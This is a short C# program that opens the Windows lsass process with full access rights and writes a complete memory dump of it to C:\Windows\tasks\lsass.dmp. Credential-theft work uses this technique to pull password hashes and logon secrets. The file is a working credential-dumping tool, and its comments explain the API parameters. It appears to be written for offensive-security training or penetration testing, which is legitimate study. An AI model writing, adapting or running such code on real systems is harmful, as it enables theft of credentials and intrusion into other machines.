using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

namespace minidump
{
    class Program
    {
        /*
         BOOL MiniDumpWriteDump(
            HANDLE hProcess, ->
            DWORD ProcessId,
            HANDLE hFile, -> file handle that contain the generated memeory dump
            MINIDUMP_TYPE DumpType, ->set to 2, for full memeory dump
            PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam, ->
            PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
            PMINIDUMP_CALLBACK_INFORMATION CallbackParam
           );
         
         */
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        static void Main(string[] args)
        {
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;

            //get lsass handle with all permission
            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);

            //convert it to a C-style file handle through the DangerousGetHandle method of the SafeHandle class.
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
